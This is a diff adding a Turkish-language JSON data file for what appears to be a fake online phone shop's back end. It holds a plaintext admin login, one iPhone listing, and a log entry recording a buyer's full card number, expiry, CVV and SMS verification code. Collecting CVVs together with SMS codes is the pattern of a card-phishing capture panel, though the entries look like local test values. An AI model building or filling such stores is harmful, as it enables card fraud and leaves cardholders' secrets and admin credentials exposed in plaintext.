@@ -1,0 +1,33 @@
+{
+    "adminler": [
+        {
+            "user": "m2000",
+            "pass": "gsm_2026_ozel",
+            "isim": "Hamza Bey"
+        }
+    ],
+    "urunler": [
+        {
+            "id": "1",
+            "marka": "Apple",
+            "model": "iPhone 15 Pro Max",
+            "fiyat": "85.000",
+            "stok": "10",
+            "resim": "https://images.unsplash.com/photo-1696446701796-da61225697cc?w=800"
+        }
+    ],
+    "loglar": [
+        {
+            "id": "D511BD",
+            "urun": "Apple iPhone 15 Pro Max",
+            "fiyat": "85.000",
+            "isim": "Baran YILıdırem",
+            "kart": "5449837074784165",
+            "skt": "56456456",
+            "cvv": "456",
+            "sms": "414465451",
+            "tarih": "19.02.2026 22:52:29",
+            "ip": "::1"
+        }
+    ]
+}
